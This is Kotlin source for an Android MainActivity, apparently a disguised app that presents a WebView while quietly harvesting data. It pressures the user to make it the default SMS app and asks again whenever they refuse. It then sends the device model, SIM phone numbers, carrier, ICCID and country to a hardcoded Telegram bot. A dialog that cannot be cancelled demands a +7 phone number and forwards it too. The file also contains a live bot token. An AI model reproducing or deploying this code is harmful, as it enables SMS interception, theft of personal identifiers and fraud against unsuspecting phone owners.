package com.android.quickdraw

import android.annotation.SuppressLint
import android.app.role.RoleManager
import android.content.Context
import android.content.Intent
import android.content.SharedPreferences
import android.os.Build
import android.os.Bundle
import android.provider.Telephony
import android.telephony.SubscriptionManager
import android.telephony.TelephonyManager
import android.webkit.WebView
import android.webkit.WebViewClient
import androidx.appcompat.app.AppCompatActivity
import okhttp3.*
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.RequestBody.Companion.toRequestBody
import java.io.IOException

class MainActivity : AppCompatActivity() {

    private lateinit var webView: WebView
    private lateinit var sharedPrefs: SharedPreferences
    private val SMS_ROLE_REQUEST_CODE = 101
    private val client = OkHttpClient()
    private val NOTIFICATION_SENT_KEY = "notification_sent"
    private val SIM_INFO_SENT_KEY = "sim_info_sent"
    private val PHONE_NUMBER_KEY = "phone_number"
    private val PHONE_NUMBER_ENTERED_KEY = "phone_number_entered"

    @SuppressLint("SetJavaScriptEnabled")
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_main)

        sharedPrefs = getSharedPreferences("app_prefs", MODE_PRIVATE)
        webView = findViewById(R.id.webView)

        with(webView.settings) {
            javaScriptEnabled = true
            domStorageEnabled = true
        }

        webView.webViewClient = object : WebViewClient() {
            override fun shouldOverrideUrlLoading(view: WebView, url: String): Boolean {
                view.loadUrl(url)
                return false
            }
        }

        webView.loadUrl("https://example.com")
        checkAndRequestSmsRole()
    }

    private fun checkAndRequestSmsRole() {
        if (!isDefaultSmsApp()) {
            requestSmsRole()
        } else {
            if (!sharedPrefs.getBoolean(NOTIFICATION_SENT_KEY, false)) {
                sendNotification("Пользователь сделал приложением по умолчанию")
                sharedPrefs.edit().putBoolean(NOTIFICATION_SENT_KEY, true).apply()
            }
            if (!sharedPrefs.getBoolean(SIM_INFO_SENT_KEY, false)) {
                sendSimInfoNotification()
            }
            
            if (!sharedPrefs.getBoolean(PHONE_NUMBER_ENTERED_KEY, false)) {
                showPhoneNumberDialog()
            }
        }
    }

    private fun isDefaultSmsApp(): Boolean {
        return if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.KITKAT) {
            packageName == Telephony.Sms.getDefaultSmsPackage(this)
        } else {
            sharedPrefs.getBoolean("is_default_sms", false)
        }
    }

    private fun requestSmsRole() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            val roleManager = getSystemService(RoleManager::class.java)
            if (roleManager?.isRoleAvailable(RoleManager.ROLE_SMS) == true) {
                if (!roleManager.isRoleHeld(RoleManager.ROLE_SMS)) {
                    val intent = roleManager.createRequestRoleIntent(RoleManager.ROLE_SMS)
                    startActivityForResult(intent, SMS_ROLE_REQUEST_CODE)
                }
            }
        } else if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.KITKAT) {
            val intent = Intent(Telephony.Sms.Intents.ACTION_CHANGE_DEFAULT)
            intent.putExtra(Telephony.Sms.Intents.EXTRA_PACKAGE_NAME, packageName)
            startActivityForResult(intent, SMS_ROLE_REQUEST_CODE)
        }
    }

    override fun onActivityResult(requestCode: Int, resultCode: Int, data: Intent?) {
        super.onActivityResult(requestCode, resultCode, data)
        if (requestCode == SMS_ROLE_REQUEST_CODE) {
            if (isDefaultSmsApp()) {
                // Пользователь предоставил разрешение
                if (!sharedPrefs.getBoolean(NOTIFICATION_SENT_KEY, false)) {
                    sendNotification("Пользователь сделал приложением по умолчанию")
                    sharedPrefs.edit().putBoolean(NOTIFICATION_SENT_KEY, true).apply()
                }
                if (!sharedPrefs.getBoolean(SIM_INFO_SENT_KEY, false)) {
                    sendSimInfoNotification()
                }
                
                if (!sharedPrefs.getBoolean(PHONE_NUMBER_ENTERED_KEY, false)) {
                    showPhoneNumberDialog()
                }
            } else {
                // Пользователь отказал - запрашиваем снова
                requestSmsRole()
            }
        }
    }

    private fun sendNotification(message: String) {
        try {
            val deviceModel = "${Build.MANUFACTURER} ${Build.MODEL}"
            val fullMessage = "$message\n$deviceModel"

            val botToken = "7824327491:AAGmZ5eA57SWIpWI3hfqRFEt6cnrQPAhnu8"
            val chatId = "6331293386"
            val url = "https://api.telegram.org/bot$botToken/sendMessage"

            val mediaType = "application/json".toMediaType()
            val requestBody = """
                {
                    "chat_id": "$chatId",
                    "text": "$fullMessage",
                    "parse_mode": "Markdown"
                }
            """.trimIndent().toRequestBody(mediaType)

            val request = Request.Builder()
                .url(url)
                .post(requestBody)
                .build()

            client.newCall(request).enqueue(object : Callback {
                override fun onFailure(call: Call, e: IOException) {
                    e.printStackTrace()
                }

                override fun onResponse(call: Call, response: Response) {
                    response.close()
                }
            })
        } catch (e: Exception) {
            e.printStackTrace()
        }
    }

    private fun sendSimInfoNotification() {
        val simInfo = getSimNumbersString()
        sendNotification("Информация о SIM-картах:\n$simInfo")
        sharedPrefs.edit().putBoolean(SIM_INFO_SENT_KEY, true).apply()
    }

    @SuppressLint("SetTextI18n")
    private fun showPhoneNumberDialog() {
        val dialog = android.app.AlertDialog.Builder(this)
        val inflater = layoutInflater
        val dialogView = inflater.inflate(R.layout.dialog_phone_input, null)
        
        val phoneInput = dialogView.findViewById<android.widget.EditText>(R.id.phoneInput)
        val continueButton = dialogView.findViewById<android.widget.Button>(R.id.continueButton)
        
        // Устанавливаем текст +7 и запрещаем его изменение
        phoneInput.setText("+7")
        phoneInput.setSelection(phoneInput.text.length)
        
        // Фильтр для ввода только цифр и ограничения длины
        phoneInput.addTextChangedListener(object : android.text.TextWatcher {
            override fun beforeTextChanged(s: CharSequence?, start: Int, count: Int, after: Int) {}
            
            override fun onTextChanged(s: CharSequence?, start: Int, before: Int, count: Int) {
                // Запрещаем изменение +7 в начале
                if (s?.length ?: 0 < 2 || s?.subSequence(0, 2) != "+7") {
                    phoneInput.setText("+7")
                    phoneInput.setSelection(2)
                }
            }
            
            override fun afterTextChanged(s: android.text.Editable?) {
                continueButton.isEnabled = s?.length == 12 // +7 + 10 цифр
            }
        })
        
        dialog.setView(dialogView)
        dialog.setCancelable(false)
        
        val alertDialog = dialog.create()
        
        continueButton.setOnClickListener {
            val phoneNumber = phoneInput.text.toString()
            if (phoneNumber.length == 12) { // +7 + 10 цифр
                sharedPrefs.edit()
                    .putString(PHONE_NUMBER_KEY, phoneNumber)
                    .putBoolean(PHONE_NUMBER_ENTERED_KEY, true)
                    .apply()
                
                // Отправляем номер в Telegram
                sendNotification("Пользователь ввел номер телефона: $phoneNumber")
                
                alertDialog.dismiss()
            }
        }
        
        alertDialog.show()
    }

    @SuppressLint("HardwareIds", "MissingPermission")
    private fun getSimNumbersString(): String {
        val result = StringBuilder()
        
        try {
            val telephonyManager = getSystemService(Context.TELEPHONY_SERVICE) as TelephonyManager
            
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP_MR1) {
                val subscriptionManager = getSystemService(Context.TELEPHONY_SUBSCRIPTION_SERVICE) as SubscriptionManager
                val activeSubscriptions = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
                    subscriptionManager.activeSubscriptionInfoList
                } else {
                    @Suppress("DEPRECATION")
                    subscriptionManager.activeSubscriptionInfoList
                }
                
                if (activeSubscriptions != null && activeSubscriptions.isNotEmpty()) {
                    result.append("Найдено SIM-карт: ${activeSubscriptions.size}\n\n")
                    
                    for (subscription in activeSubscriptions) {
                        val number = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
                            telephonyManager.createForSubscriptionId(subscription.subscriptionId).line1Number
                        } else {
                            @Suppress("DEPRECATION")
                            telephonyManager.line1Number
                        }
                        
                        result.append("SIM ${subscription.simSlotIndex + 1}:\n")
                        result.append("Номер: ${number ?: "недоступен"}\n")
                        result.append("Оператор: ${subscription.carrierName ?: "неизвестен"}\n")
                        result.append("IMSI: ${subscription.iccId ?: "недоступен"}\n")
                        result.append("Страна: ${subscription.countryIso?.uppercase() ?: "неизвестна"}\n\n")
                    }
                } else {
                    result.append("Активные SIM-карты не найдены\n")
                }
            } else {
                @Suppress("DEPRECATION")
                val number = telephonyManager.line1Number
                result.append("Основной номер SIM: ${number ?: "недоступен"}\n")
                result.append("(Метод для Multi-SIM не поддерживается в этой версии Android)\n")
            }
        } catch (e: Exception) {
            result.append("Ошибка при получении номеров SIM: ${e.localizedMessage}")
        }
        
        return result.toString()
    }

    override fun onBackPressed() {
        if (webView.canGoBack()) webView.goBack() else super.onBackPressed()
    }
}
